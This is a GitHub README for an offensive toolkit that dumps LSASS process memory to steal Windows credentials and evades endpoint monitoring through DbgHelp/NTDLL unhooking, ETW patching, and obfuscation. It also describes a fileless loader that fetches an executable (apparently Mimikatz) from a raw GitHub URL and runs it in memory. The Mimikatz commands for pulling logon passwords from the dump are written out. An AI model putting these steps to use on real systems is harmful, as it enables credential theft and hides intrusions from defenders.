# DumpL-a-_PE_Loder

Dumping LSASS by Unhooking MiniDumpWriteDump by getting a fresh DbgHelp.dll copy from the disk , plus functions and strings obfuscation, duplicate lsass handle from existed processes.
Download and Run the MiniDump.exe ( It will create a dump file in tmp folder)

Loading Fileless Remote PE from URI to memory with argument passing and ETW patching and NTDLL unhooking.
Download and run the RemotePE.exe
Enter in the URI write the Portable Excutable file path ( https://github.com/0d1y/mirrordump/blob/main/mimi.exe?raw=true ) 
Mimikatz commands:
sekurlsa::minidump <dump file full path>
sekurlsa::logonPasswords 
  


https://github.com/D1rkMtr/FilelessRemotePE/tree/main/RemotePE

https://github.com/D1rkMtr/DumpThatLSASS
